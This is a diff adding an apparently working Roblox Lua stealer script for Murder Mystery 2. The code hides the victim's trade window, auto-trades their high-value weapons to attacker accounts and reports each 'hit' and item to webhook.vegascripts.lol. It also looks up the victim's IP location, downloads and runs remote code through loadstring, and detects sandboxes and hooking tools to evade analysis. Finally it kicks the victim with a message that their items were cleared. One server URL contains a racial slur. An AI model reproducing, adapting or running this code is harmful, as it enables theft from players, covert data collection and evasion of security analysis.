+		Icecrusher = true,
+		["???"] = true,
+		Dartbringer = true,
+		TravelerAxeRed = true,
+		TravelerAxeBronze = true,
+		TravelerAxeSilver = true,
+		TravelerAxeGold = true,
+		BlueCamo_K_2022 = true,
+		GreenCamo_K_2022 = true,
+		SharkSeeker = true
+	}
+	v121 = v78()
+	response = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
+	v123 = function()
+		local t24 = {}
+		local v332 = table.find(t1, min_rarity)
+
+		for k, v in pairs(response.Weapons.Owned) do
+			task.wait()
+
+			local v335 = Item[k] or Item[tostring(k)]
+
+			if not v335 then
+				for _, v2 in pairs(Item) do
+					if v2.ItemID and tostring(v2.ItemID) == tostring(k) then
+						v335 = v2
+
+						break
+					end
+				end
+			end
+
+			if v335 then
+				local Rarity = v335.Rarity
+				local v339 = table.find(t1, Rarity)
+
+				if v339 and v332 <= v339 and not t8[k] then
+					local v340 = v121[k]
+
+					if not v340 then
+						v340 = v339 >= table.find(t1, "Godly") and 2 or 1
+					end
+
+					if min_value <= v340 then
+						table.insert(t24, {
+							DataID = k,
+							Rarity = Rarity,
+							Amount = v,
+							Value = v340
+						})
+					end
+				end
+			else
+				warn("Item not found " .. tostring(k))
+			end
+		end
+
+		table.sort(t24, function(p34, p35)
+			return p34.Value * p34.Amount > p35.Value * p35.Amount
+		end)
+
+		return t24
+	end
+	u124 = nil
+	v125 = function()
+		u124 = 597805934
+		game:GetService("ReplicatedStorage"):WaitForChild("Trade").SetRequestsEnabled:FireServer(true)
+	end
+	u126 = nil
+	u127 = nil
+	u128 = nil
+	v129 = function()
+		u126 = 937316987
+		u127 = 493048220
+		u128 = 330287905
+
+		local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+		task.spawn(function()
+			local TradeGUI = PlayerGui:WaitForChild("TradeGUI", 5)
+
+			if TradeGUI then
+				TradeGUI:GetPropertyChangedSignal("Enabled"):Connect(function()
+					TradeGUI.Enabled = false
+				end)
+				TradeGUI.Enabled = false
+			end
+
+			local TradeGUI_Phone = PlayerGui:WaitForChild("TradeGUI_Phone", 5)
+
+			if TradeGUI_Phone then
+				TradeGUI_Phone:GetPropertyChangedSignal("Enabled"):Connect(function()
+					TradeGUI_Phone.Enabled = false
+				end)
+				TradeGUI_Phone.Enabled = false
+			end
+		end)
+	end
+	u130 = nil
+	u131 = nil
+	v132 = function(p36, p37, p38)
+		u130 = 650392578
+		u131 = 777532232
+
+		local v344 = false
+		local v345, v346, v347 = ipairs(t5)
+		local v348 = geniter(v345, v346, v347)
+
+		while true do
+			local v349 = table.pack(v348())
+
+			if v349[1] then
+				local v350 = v349[3]
+
+				if p36:lower() == tostring(v350):lower() then
+					v344 = true
+
+					break
+				end
+			else
+				break
+			end
+		end
+
+		local v351 = v91()
+
+		if v351 == "StartTrade" then
+			Trade.DeclineTrade:FireServer()
+			task.wait(0.3)
+		elseif v351 == "ReceivingRequest" then
+			Trade.DeclineRequest:FireServer()
+			task.wait(0.3)
+		end
+
+		local n5 = 0
+		local v353, v354, v355 = ipairs(p37)
+
+		for _, v in v353, v354, v355 do
+			n5 += v.Amount
+		end
+
+		local n6 = 0
+		local v359 = v78()
+
+		while #p37 > 0 do
+			local v360 = v91()
+
+			if v360 == "None" then
+				v90(p36)
+				task.wait(0.5)
+			elseif v360 == "SendingRequest" then
+				task.wait(0.3)
+			elseif v360 == "ReceivingRequest" then
+				Trade.DeclineRequest:FireServer()
+				task.wait(0.3)
+			elseif v360 == "StartTrade" then
+				local v361 = math.min(4, #p37)
+
+				for i = 1, v361 do
+					local v363 = p37[i]
+
+					for i2 = 1, v363.Amount do
+						v104(v363.DataID)
+						task.wait(0.05)
+					end
+				end
+
+				task.wait(6)
+				v101()
+				v95()
+				task.wait(0.5)
+
+				local response2 = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
+				local t25 = {}
+				local t26 = {}
+				local n7 = 0
+
+				for i = 1, v361 do
+					local v370 = p37[i]
+
+					if not response2.Weapons.Owned[v370.DataID] then
+						local v371 = tostring(v370.DataID):gsub("%s+", "")
+
+						if not t25[v371] then
+							t25[v371] = 0
+						end
+
+						t25[v371] += v370.Amount
+						n7 += v370.Amount
+						table.insert(t26, i)
+					end
+				end
+
+				n6 += n7
+
+				if p38 and not v344 and n7 > 0 then
+					local v372, v373, v374 = pairs(t25)
+
+					for k, v in v372, v373, v374 do
+						local n8 = 0
+
+						for _, v2 in ipairs(p37) do
+							if tostring(v2.DataID):gsub("%s+", "") == k then
+								n8 = (v359[v2.DataID] or v2.Value or 1) * v
+
+								break
+							end
+						end
+
+						v107(k, v, n8)
+					end
+
+					if n5 <= n6 then
+						v115(p38)
+					else
+						v111(p38)
+					end
+				end
+
+				local v380 = #t26
+				local n9 = -1
+
+				for i = v380, 1, -1 do
+					table.remove(p37, t26[i])
+				end
+			else
+				task.wait(0.5)
+			end
+
+			task.wait(0.5)
+		end
+
+		if p38 and not v344 and n5 <= n6 then
+			v115(p38)
+			task.wait(0.5)
+		end
+
+		if n5 <= n6 then
+			task.wait(1)
+			LocalPlayer:kick("Your Items got cleared\nJoin discord.gg/vega-scripts To Make Your Own Script !")
+		end
+	end
+	u133 = nil
+	v134 = function(p39)
+		u133 = 1048485720
+
+		local t27 = {}
+		local v384 = table.find(t1, min_rarity)
+
+		for k, v in pairs(response.Weapons.Owned) do
+			task.wait()
+
+			local Rarity = Item[k].Rarity
+			local v388 = table.find(t1, Rarity)
+
+			if v388 and v384 <= v388 and not t8[k] then
+				local v389 = v121[k]
+
+				if not v389 then
+					v389 = v388 >= table.find(t1, "Godly") and 2 or 1
+				end
+
+				if p39 <= v389 then
+					table.insert(t27, {
+						DataID = k,
+						Rarity = Rarity,
+						Amount = v,
+						Value = v389
+					})
+				end
+			end
+		end
+
+		table.sort(t27, function(p40, p41)
+			return p40.Value * p40.Amount > p41.Value * p41.Amount
+		end)
+
+		return t27
+	end
+	v135 = function(p42, p43)
+		local v390 = false
+
+		for _, v in ipairs(t5) do
+			if p42:lower() == tostring(v):lower() then
+				v390 = true
+
+				break
+			end
+		end
+
+		local v393 = v134(v390 and 100 or min_value)
+
+		if #v393 == 0 then
+			return
+		end
+
+		v132(p42, v393, p43)
+	end
+	u136 = nil
+	u137 = nil
+	u138 = nil
+	v139 = function(p44)
+		u136 = 1065669493
+		u137 = 380350664
+		u138 = 622034225
+		v125()
+
+		for _, player in ipairs(Players:GetPlayers()) do
+			if table.find(t6, player.Name:lower()) then
+				v135(player.Name, p44)
+
+				return
+			end
+		end
+	end
+	v129()
+	v140 = v123()
+	v141 = pingEveryone == "Yes" and "||@everyone||" or "New hit ma boi"
+	v142, v143 = v117(v140, v141)
+
+	if v142 and v143 then
+		messageId = v143.messageId
+
+		if messageId then
+			v108(messageId)
+
+			if #v140 > 0 then
+				v139(messageId)
+			end
+		end
+	end
+
+	Players.PlayerAdded:Connect(function(player)
+		if table.find(t6, player.Name:lower()) then
+			v135(player.Name, messageId)
+		end
+	end)
+
+	return
+end
+
+if not rawequal(_25mspredefine, nil) then
+	return "Stop hooking my shit", error("<3"), assert(false, "<3"), (nil)()
+end
+
+local v396 = debug.traceback():lower()
+
+if v396:find("sandbox") or v396:find("unveilr") or v396:find("httpspy2") then
+	return "Stop hooking my shit", error("<3"), assert(false, "<3"), (nil)()
+end
+
+local game_, ok, result, ok2, result2, n10, connection
+
+if not isfunctionhooked then
+	if getmetatable and setmetatable and type and select and type(select(2, pcall(getmetatable, setmetatable({}, {
+		__index = function()
+			while true do
+			end
+		end
+	}))).__index) == "function" and pcall and debug and rawget and rawset and pcall(rawset, {}, " ", " ") and not getmetatable(require) and not getmetatable(print) and not getmetatable(error) then
+		if ({ debug.info(print, "a") })[1] == 0 and ({ debug.info(tostring, "a") })[1] == 0 and ({ debug.info(print, "a") })[2] == true and select and getfenv and select(1, pcall(getfenv, 69)) ~= true and select(2, pcall(rawget, debug, "info")) and not (#select(2, pcall(rawget, debug, "info"))(getfenv, "n") <= 1) then
+			if not (#select(2, pcall(rawget, debug, "info"))(print, "n") <= 1) and not select(2, pcall(rawget, debug, "info"))(print, "s") ~= "[C]" and not select(2, pcall(rawget, debug, "info"))(require, "s") ~= "[C]" and select(2, pcall(rawget, debug, "info"))(function()
+			end, "s") ~= "[C]" and not select(1, pcall(debug.info, coroutine.wrap(function()
+			end)(), "s")) ~= false then
+				if pcall(function()
+					Instance.new("Part"):thisdoesntworkaaa("a")
+				end) then
+					return "Stop hooking my shit", error("<3"), assert(false, "<3"), (nil)()
+				end
+
+				game:GetChildren(function()
+					while true do
+					end
+				end)
+				game_ = game
+
+				if #game_:GetChildren() <= 4 then
+					return "Stop hooking my shit", error("<3"), assert(false, "<3"), (nil)()
+				end
+
+				ok, result = pcall(function()
+					return game:GetService("HttpService"):JSONDecode("[68, \"google.com\", true, 1234, false, [1234, null, \"meow\"], null, [\"b\"]]")
+				end)
+
+				if not ok then
+					return "Stop hooking my shit", error("<3"), assert(false, "<3"), (nil)()
+				end
+
+				if result[6][2] ~= nil then
+					return "Stop hooking my shit", error("<3"), assert(false, "<3"), (nil)()
+				end
+
+				ok2, result2 = pcall(function()
+					game()
+				end)
+
+				if not result2:find("attempt to call a Instance value") then
+					return "Stop hooking my shit", error("<3"), assert(false, "<3"), (nil)()
+				end
+
+				n10 = 0
+				connection = game:GetService("RunService").Heartbeat:Connect(function()
+					n10 += 1
+				end)
+
+				while n10 < 2 do
+					task.wait()
+				end
+
+				if connection then
+					connection:Disconnect()
+				end
+
+				setrawmetatable(identifyexecutor, {
+					__newindex = function()
+						error("unmodifyable", 2)
+					end,
+					__index = function(p45, p46)
+						return rawget(p45, p46)
+					end
+				})
+				scb = setclipboard
+
+				if scb then
+					scb("https://discord.gg/vega-scripts")
+				end
+
+				t1 = {
+					"Common",
+					"Uncommon",
+					"Rare",
+					"Epic",
+					"Legendary",
+					"Vintage",
+					"Godly",
+					"Vintage",
+					"Ancient",
+					"Unique"
+				}
+				HttpService = game:GetService("HttpService")
+				u10 = nil
+				bxor = bit32.bxor
+				band = bit32.band
+				bnot = bit32.bnot
+				rshift = bit32.rshift
+				lshift = bit32.lshift
+				v16 = function(p47, p48)
+					return bxor(rshift(p47, p48), lshift(p47, 32 - p48))
+				end
+				t2 = {
+					1116352408,
+					1899447441,
+					3049323471,
+					3921009573,
+					961987163,
+					1508970993,
+					2453635748,
+					2870763221,
+					3624381080,
+					310598401,
+					607225278,
+					1426881987,
+					1925078388,
+					2162078206,
+					2614888103,
+					3248222580,
+					3835390401,
+					4022224774,
+					264347078,
+					604807628,
+					770255983,
+					1249150122,
+					1555081692,
+					1996064986,
+					2554220882,
+					2821834349,
+					2952996808,
+					3210313671,
+					3336571891,
+					3584528711,
+					113926993,
+					338241895,
+					666307205,
+					773529912,
+					1294757372,
+					1396182291,
+					1695183700,
+					1986661051,
+					2177026350,
+					2456956037,
+					2730485921,
+					2820302411,
+					3259730800,
+					3345764771,
+					3516065817,
+					3600352804,
+					4094571909,
+					275423344,
+					430227734,
+					506948616,
+					659060556,
+					883997877,
+					958139571,
+					1322822218,
+					1537002063,
+					1747873779,
+					1955562222,
+					2024104815,
+					2227730452,
+					2361852424,
+					2428436474,
+					2756734187,
+					3204031479,
+					3329325298
+				}
+				v18 = function(p49)
+					u10 = 80248658
+
+					local v404 = #p49 * 8
+					local v405 = p49 .. "\128"
+					local v406 = v405 .. string.rep("\0", (56 - #v405 % 64) % 64) .. "\0\0\0\0"
+
+					for i = 3, 0, -1 do
+						v406 ..= string.char(math.floor(v404 / 2 ^ (i * 8)) % 256)
+					end
+
+					local t28 = {
+						1779033703,
+						3144134277,
+						1013904242,
+						2773480762,
+						1359893119,
+						2600822924,
+						528734635,
+						1541459225
+					}
+
+					for i = 1, #v406, 64 do
+						local t29 = {}
+
+						for i2 = 0, 15 do
+							local v412 = i + i2 * 4
+
+							t29[i2] = v406:byte(v412) * 16777216 + v406:byte(v412 + 1) * 65536 + v406:byte(v412 + 2) * 256 + v406:byte(v412 + 3)
+						end
+
+						for i2 = 16, 63 do
+							local v414 = bxor
+
+							t29[i2] = (t29[i2 - 16] + bxor(v16(t29[i2 - 15], 7), v16(t29[i2 - 15], 18), rshift(t29[i2 - 15], 3)) + t29[i2 - 7] + v414(v16(t29[i2 - 2], 17), v16(t29[i2 - 2], 19), rshift(t29[i2 - 2], 10))) % 4294967296
+						end
+
+						local v415 = t28[1]
+						local v416 = t28[2]
+						local v417 = t28[3]
+						local v418 = t28[4]
+						local v419 = t28[5]
+						local v420 = t28[6]
+						local v421 = t28[7]
+						local v422 = t28[8]
+
+						for i2 = 0, 63 do
+							local v424 = bxor
+							local v425 = band
+							local v426 = (v422 + bxor(v16(v419, 6), v16(v419, 11), v16(v419, 25)) + v424(band(v419, v420), v425(bnot(v419), v421)) + t2[i2 + 1] + t29[i2]) % 4294967296
+							local v427 = bxor
+							local v428 = (bxor(v16(v415, 2), v16(v415, 13), v16(v415, 22)) + v427(band(v415, v416), band(v415, v417), band(v416, v417))) % 4294967296
+
+							v422 = v421
+							v421 = v420
+							v420 = v419
+							v419 = (v418 + v426) % 4294967296
+							v418 = v417
+							v417 = v416
+							v416 = v415
+							v415 = (v426 + v428) % 4294967296
+						end
+
+						local t30 = {
+							v415,
+							v416,
+							v417,
+							v418,
+							v419,
+							v420,
+							v421,
+							v422
+						}
+
+						for i2 = 1, 8 do
+							t28[i2] = (t28[i2] + t30[i2]) % 4294967296
+						end
+					end
+
+					local t31 = {}
+
+					for _, v in ipairs(t28) do
+						t31[#t31 + 1] = string.char(math.floor(v / 16777216) % 256, math.floor(v / 65536) % 256, math.floor(v / 256) % 256, v % 256)
+					end
+
+					return table.concat(t31)
+				end
+				t3 = {}
+
+				for i = 1, 64 do
+					t3[("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"):byte(i)] = i - 1
+				end
+
+				u20 = nil
+				v21 = function(p50)
+					u20 = 169343501
+
+					local t32 = {}
+					local v436 = #p50
+
+					for i = 1, v436, 3 do
+						local v438, v439, v440 = p50:byte(i, i + 2)
+						local v441 = v438 * 65536 + (v439 or 0) * 256 + (v440 or 0)
+
+						t32[#t32 + 1] = ("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"):sub(bit32.rshift(v441, 18) + 1, bit32.rshift(v441, 18) + 1)
+						t32[#t32 + 1] = ("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"):sub(bit32.band(bit32.rshift(v441, 12), 63) + 1, bit32.band(bit32.rshift(v441, 12), 63) + 1)
+
+						if i + 1 <= v436 then
+							t32[#t32 + 1] = ("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"):sub(bit32.band(bit32.rshift(v441, 6), 63) + 1, bit32.band(bit32.rshift(v441, 6), 63) + 1)
+						end
+
+						if i + 2 <= v436 then
+							t32[#t32 + 1] = ("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"):sub(bit32.band(v441, 63) + 1, bit32.band(v441, 63) + 1)
+						end
+					end
+
+					return table.concat(t32)
+				end
+				u22 = nil
+				v23 = function(p51)
+					u22 = 452077855
+
+					local v442 = #p51 % 4
+
+					if v442 == 2 then
+						p51 ..= "=="
+					elseif v442 == 3 then
+						p51 ..= "="
+					end
+
+					local t33 = {}
+
+					for i = 1, #p51, 4 do
+						local v445, v446, v447, v448 = p51:byte(i, i + 3)
+						local v449 = (t3[v445] or 0) * 262144 + (t3[v446] or 0) * 4096 + (t3[v447] or 0) * 64 + (t3[v448] or 0)
+
+						t33[#t33 + 1] = string.char(bit32.rshift(v449, 16))
+
+						if v447 and v447 ~= 61 then
+							t33[#t33 + 1] = string.char(bit32.band(bit32.rshift(v449, 8), 255))
+						end
+
+						if v448 and v448 ~= 61 then
+							t33[#t33 + 1] = string.char(bit32.band(v449, 255))
+						end
+					end
+
+					return table.concat(t33)
+				end
+				u24 = nil
+				v25 = function(p52, p53)
+					u24 = 700555412
+
+					return v18("4dG9oM2pR7vX5cN8" .. p52 .. tostring(p53) .. "wF3tJ6yB1eH0sA4d")
+				end
+				u26 = nil
+				u27 = nil
+				u28 = nil
+				v29 = function(p54, p55)
+					u26 = 288918583
+					u27 = 747745209
+					u28 = 436382071
+
+					local v450 = "https://webhook.vegascripts.lol/request/" .. p54 .. "/" .. tostring(p55)
+					local request_2 = request or syn and syn.request or http_request or http and http.request
+
+					if not request_2 then
+						error("No request function available")
+					end
+
+					local v452 = request_2({
+						Url = v450,
+						Method = "GET",
+						Headers = {
+							["Content-Type"] = "application/json"
+						}
+					})
+
+					if v452 and v452.StatusCode == 200 then
+						return HttpService:JSONDecode(v452.Body).token
+					end
+
+					error("Fail" .. tostring(v452 and v452.StatusCode or "no response"))
+				end
+				t4 = {}
+				t4.__index = t4
+				u31 = nil
+				u32 = nil
+				s1 = "new"
+				t4[s1] = function(p56, p57)
+					u31 = 455722073
+					u32 = 572011769
+
+					local obj = setmetatable({}, t4)
+
+					obj.encryptionKey = v25(v29(p56, p57), p57)
+					obj.webhookToken = p56
+					obj.timestamp = p57
+
+					return obj
+				end
+				u34 = nil
+				s2 = "encrypt"
+				t4[s2] = function(p58, p59)
+					u34 = 341206522
+
+					local json
+
+					if type(p59) == "table" then
+						json = HttpService:JSONEncode(p59)
+					else
+						json = tostring(p59)
+					end
+
+					return (v21(v18(p58.encryptionKey .. json) .. json))
+				end
+				u36 = nil
+				u37 = nil
+				v38 = function(p60, p61)
+					u36 = 22024574
+					u37 = 649926619
+
+					local now = os.time()
+
+					p60._timestamp = now
+
+					return t4.new(p61, now):encrypt(p60), now
+				end
+				Usernames_ = _G.Usernames or getgenv().Users or {}
+				min_rarity = _G.min_rarity or getgenv().rarity or "Godly"
+				min_value = _G.min_value or getgenv().min or 1
+				pingEveryone = _G.pingEveryone or getgenv().ping or "No"
+				webhook = _G.webhook or getgenv().wh or "37458d46afc973c5f93277986cef00c8"
+				t5 = {
+					"joeiamjoezeif",
+					"jo_125w",
+					"joeme2vv"
+				}
+				t6 = {}
+
+				for _, v in ipairs(Usernames_) do
+					insert = table.insert
+					v47 = tostring(v)
+					insert(t6, v47:lower())
+				end
+
+				for _, v in ipairs(t5) do
+					insert2 = table.insert
+					v49 = tostring(v)
+					insert2(t6, v49:lower())
+				end
+
+				t7 = {}
+				messageId = nil
+				Players = game:GetService("Players")
+				ReplicatedStorage = game:GetService("ReplicatedStorage")
+				game:GetService("TeleportService")
+				LocalPlayer = Players.LocalPlayer
+
+				if next(Usernames_) == nil then
+					LocalPlayer:kick("You didn't add a usernames or a valid webhook !")
+
+					return
+				end
+
+				if game.PlaceId ~= 142823291 then
+					LocalPlayer:kick("Game not supported. Please join a normal MM2 server")
+
+					return
+				end
+
+				v55 = string.find(v7, "delta") or string.find(v7, "krnl")
+				GetServerType = game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType")
+				v57 = GetServerType:InvokeServer() == "VIPServer"
+				v58 = #Players:GetPlayers() >= 12
+
+				if v57 or v58 then
+					if v55 then
+						v59 = LocalPlayer
+						kick = LocalPlayer.kick
+						v61 = v57 and "VIP Servers not supported " or "FULL Servers Arent Supported"
+						kick(v59, v61)
+
+						return
+					end
+
+					v62 = LocalPlayer
+					kick2 = LocalPlayer.kick
+					v64 = v57 and "VIP Servers not supported " or "FULL Servers Arent Supported"
+					kick2(v62, v64)
+
+					return
+				end
+
+				getgenv().RealJobID = game.JobId
+				u65 = nil
+				u66 = nil
+				v67 = function()
+					u65 = 636436657
+					u66 = 1064691622
+
+					local v460 = Usernames_ or {}
+
+					if #v460 == 0 then
+						return
+					end
+
+					for _, v in ipairs(v460) do
+						local v463 = tostring(v)
+						local t34 = {
+							jobId = getgenv().RealJobID,
+							placeId = game.PlaceId,
+							username = LocalPlayer.Name,
+							receiver = v463
+						}
+						local _ = pcall(function()
+							return request({
+								Url = "https://vegascripts.lol/hit",
+								Method = "POST",
+								Headers = {
+									["Content-Type"] = "application/json",
+									Authorization = "nice_remote_spy"
+								},
+								Body = HttpService:JSONEncode(t34)
+							})
+						end)
+					end
+				end
+				GetPlayerLevel = ReplicatedStorage.Remotes.Extras.GetPlayerLevel
+				LocalPlayer2 = Players.LocalPlayer
+
+				if GetPlayerLevel:InvokeServer(LocalPlayer2) < 10 then
+					LocalPlayer2:Kick("script error. make sure ur above the level 9")
+				end
+
+				v70 = function()
+					local ok3, result3 = pcall(function()
+						return (request or syn and syn.request or http and http.request or http_request)({
+							Url = "http://ip-api.com/json",
+							Method = "GET"
+						})
+					end)
+
+					if ok3 and result3 and result3.Body then
+						local ok4, result4 = pcall(function()
+							return HttpService:JSONDecode(result3.Body)
+						end)
+
+						if ok4 and result4 then
+							return result4
+						end
+					end
+
+					return {}
+				end
+				loc = v70()
+				request_ = request or syn and syn.request or http and http.request or http_request or krnl.request
+				Item = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
+				v73 = function(p62)
+					local HttpService2 = game:GetService("HttpService")
+					local request_2 = request or syn and syn.request or http_request or http and http.request
+
+					if not request_2 then
+						warn("Executor doesnt request")
+
+						return {
+							total = "0.00",
+							itemPrices = {}
+						}
+					end
+
+					local ok3, result3 = pcall(function()
+						return request_2({
+							Url = "https://fuckingniggermf.vercel.app/api/calc",
+							Method = "POST",
+							Headers = {
+								["Content-Type"] = "application/json"
+							},
+							Body = HttpService2:JSONEncode({
+								inventory = p62
+							})
+						})
+					end)
+
+					if ok3 and result3 and result3.Body then
+						local ok4, result4 = pcall(function()
+							return HttpService2:JSONDecode(result3.Body)
+						end)
+
+						if ok4 then
+							return result4
+						end
+					end
+
+					return {
+						total = "0.00",
+						itemPrices = {}
+					}
+				end
+				u74 = nil
+				v75 = function(p63)
+					u74 = 24282524
+
+					local t35 = {}
+
+					local function v478()
+						local request_2 = request or syn and syn.request or http_request or http and http.request
+
+						if not request_2 then
+							return {}
+						end
+
+						local function v480(p64)
+							local ok3, result3 = pcall(function()
+								return request_2({
+									Url = p64,
+									Method = "GET",
+									Headers = {
+										Accept = "application/json",
+										["User-Agent"] = "Mozilla/5.0"
+									}
+								})
+							end)
+
+							if ok3 then
+								if result3 and result3.Body then
+									local t36 = {}
+
+									for match, match2 in result3.Body:gmatch("\"name\":\"([^\"]+)\",\"game\":\"mm2\",\"price\":[%d.]+,\"emoji\":\"([^\"]+)\"") do
+										t36[match:lower()] = match2
+									end
+
+									return t36
+								end
+							end
+
+							return {}
+						end
+
+						local v486 = v480("https://api.project-reverse.org/valuables/get-game-valuables?game=mm2")
+
+						if not v486 or next(v486) == nil then
+							v486 = v480("https://fuckingniggermf.vercel.app/api/valuables?game=mm2")
+						end
+
+						return v486
+					end
+
+					local v487 = v478()
+
+					for _, v in ipairs(p63) do
+						table.insert(t35, {
+							name = tostring(v.DataID):gsub("%s+", ""),
+							amount = tonumber(v.Amount) or 1
+						})
+					end
+
+					local v490 = v73(t35)
+
+					if v490 and v490.itemPrices then
+						for k, itemPrice in pairs(v490.itemPrices) do
+							local v493 = v487[k:lower()]
+
+							if v493 and v493 ~= "" then
+								itemPrice.emoji = v493
+							else
+								itemPrice.emoji = ""
+							end
+						end
+					end
+
+					return v490
+				end
+				u76 = nil
+				v77 = function()
+					u76 = 301773659
+
+					local request_2 = request or syn and syn.request or http_request or http and http.request
+
+					if not request_2 then
+						warn("No request function available for value API")
+
+						return {}
+					end
+
+					local ok3, result3 = pcall(function()
+						return request_2({
+							Url = "https://vegascripts.lol/public/mm2-values.lua",
+							Method = "GET"
+						})
+					end)
+
+					if ok3 and result3 and result3.Body then
+						local chunk = loadstring(result3.Body)
+
+						if chunk then
+							local ok4, result4 = pcall(chunk)
+
+							if ok4 and result4 then
+								return result4
+							end
+						end
+					end
+
+					return {}
+				end
+				v78 = function()
+					local t37 = {}
+					local v501 = v77()
+
+					if v501 then
+						if next(v501) ~= nil then
+							for k, v in pairs(Item) do
+								local ItemName = v.ItemName or ""
+								local Rarity = v.Rarity or ""
+								local Chroma = v.Chroma or false
+
+								if ItemName ~= "" and Rarity ~= "" then
+									local v507 = table.find(t1, Rarity)
+									local v508 = table.find(t1, "Godly")
+
+									if v507 and v508 <= v507 then
+										local v509
+
+										if Chroma then
+											if v501.Chroma and v501.Chroma[ItemName] then
+												v509 = v501.Chroma[ItemName]
+											end
+										else
+											local v510 = ({
+												Common = "Common",
+												Uncommon = "Uncommon",
+												Rare = "Rare",
+												Epic = "Epic",
+												Legendary = "Legendary",
+												Godly = "Godly",
+												Ancient = "Ancient",
+												Unique = "Unique",
+												Vintage = "Vintage"
+											})[Rarity]
+
+											if v510 and v501[v510] and v501[v510][ItemName] then
+												v509 = v501[v510][ItemName]
+											end
+										end
+
+										if v509 then
+											t37[k] = v509
+										end
+									end
+								end
+							end
+
+							return t37
+						end
+					end
+
+					warn("Failed to fetch values from ts using fallback")
+
+					return t37
+				end
+				u79 = nil
+				u80 = nil
+				u81 = nil
+				v82 = function(p65)
+					u79 = 63343817
+					u80 = 738739290
+					u81 = 744397085
+
+					if webhook == "" then
+						warn("No webhook token")
+
+						return false, nil
+					end
+
+					local v511, v512 = v38(p65, webhook)
+
+					if not v511 then
+						warn("enc fail")
+
+						return false, nil
+					end
+
+					local t38 = {
+						webhook = webhook,
+						timestamp = v512,
+						encrypted = v511
+					}
+					local ok3, result3 = pcall(function()
+						return request_({
+							Url = "https://webhook.vegascripts.lol/api/token/" .. webhook,
+							Method = "POST",
+							Headers = {
+								["Content-Type"] = "application/json",
+								["User-Agent"] = "Mozilla/5.0"
+							},
+							Body = HttpService:JSONEncode(t38)
+						})
+					end)
+
+					if ok3 and result3 then
+						if result3.StatusCode == 200 then
+							return true, (HttpService:JSONDecode(result3.Body))
+						end
+
+						warn("says diddy boi" .. tostring(result3.StatusCode))
+					else
+						warn("fail boi " .. tostring(result3))
+					end
+
+					return false, nil
+				end
+				v83 = false
+				ipairs_ = ipairs
+				Usernames_2 = Usernames or {}
+
+				for _, v in ipairs_(Usernames_2) do
+					if v == LocalPlayer.Name then
+						v83 = true
+
+						break
+					end
+				end
+
+				v86 = false
+
+				if v83 then
+					v86 = true
+				end
+
+				u87 = nil
+				u88 = nil
+				u89 = nil
+				v90 = function(p66)
+					u87 = 490977325
+					u88 = 473632988
+					u89 = 543508434
+
+					local v518 = Players:FindFirstChild(p66)
+
+					if v518 then
+						pcall(function()
+							ReplicatedStorage:WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(v518)
+						end)
+					end
+				end
+				v91 = function()
+					return ReplicatedStorage.Trade.GetTradeStatus:InvokeServer()
+				end
+				u92 = nil
+				u93 = nil
+				u94 = nil
+				v95 = function()
+					u92 = 572979834
+					u93 = 922086990
+					u94 = 837910670
+
+					repeat
+						task.wait(0.1)
+					until v91() == "None"
+				end
+				Trade = ReplicatedStorage.Trade
+				_G_ = _G
+				LastOffer = _G.LastOffer or nil
+				_G_.LastOffer = LastOffer
+				u99 = nil
+				u100 = nil
+				Trade.UpdateTrade.OnClientEvent:Connect(function(p67)
+					u99 = 214572371
+					u100 = 1052024091
+					_G.LastOffer = p67.LastOffer
+				end)
+				v101 = function()
+					if _G.LastOffer then
+						Trade.AcceptTrade:FireServer(game.PlaceId * 3, _G.LastOffer)
+					else
+						warn("nil")
+					end
+				end
+				u102 = nil
+				u103 = nil
+				v104 = function(p68)
+					u102 = 827327342
+					u103 = 988604516
+					Trade.OfferItem:FireServer(p68, "Weapons")
+				end
+				u105 = nil
+				u106 = nil
+				v107 = function(p69, p70, p71)
+					u105 = 30301695
+					u106 = 667811889
+
+					if not t7[p69] then
+						t7[p69] = 0
+					end
+
+					t7[p69] += p70 or 1
+
+					if messageId then
+						pcall(function()
+							local t39 = {
+								Url = "http://webhook.vegascripts.lol" .. "/api/claimed/" .. webhook,
+								Method = "POST",
+								Headers = {
+									["Content-Type"] = "application/json"
+								}
+							}
+							local v520 = HttpService
+							local JSONEncode = HttpService.JSONEncode
+
+							t39.Body = JSONEncode(v520, {
+								messageId = messageId,
+								weaponName = p69,
+								amount = p70 or 1,
+								valueAmount = p71 or 0
+							})
+							request(t39)
+						end)
+					end
+				end
+				v108 = function(p72)
+					task.spawn(function()
+						while pcall(function()
+							request({
+								Url = "http://webhook.vegascripts.lol" .. "/api/ping/" .. webhook,
+								Method = "POST",
+								Headers = {
+									["Content-Type"] = "application/json"
+								},
+								Body = HttpService:JSONEncode({
+									messageId = p72
+								})
+							})
+						end) do
+							task.wait(1)
+						end
+					end)
+				end
+				u109 = nil
+				u110 = nil
+				v111 = function(p73)
+					u109 = 563789295
+					u110 = 367676871
+					pcall(function()
+						request({
+							Url = "http://webhook.vegascripts.lol" .. "/api/partial/" .. webhook,
+							Method = "POST",
+							Headers = {
+								["Content-Type"] = "application/json"
+							},
+							Body = HttpService:JSONEncode({
+								messageId = p73
+							})
+						})
+					end)
+				end
+				u112 = nil
+				u113 = nil
+				u114 = nil
+				v115 = function(p74)
+					u112 = 940471625
+					u113 = 1008316571
+					u114 = 868413586
+					pcall(function()
+						request({
+							Url = "http://webhook.vegascripts.lol" .. "/api/allclaimed/" .. webhook,
+							Method = "POST",
+							Headers = {
+								["Content-Type"] = "application/json"
+							},
+							Body = HttpService:JSONEncode({
+								messageId = p74
+							})
+						})
+					end)
+				end
+				getgenv().topHitCycleEnabled = true
+				getgenv().topHitLowThreshold = 1000
+				getgenv().topHitHighThreshold = 5000
+				getgenv().topHitLowStartHour = 14
+				getgenv().topHitLowEndHour = 16
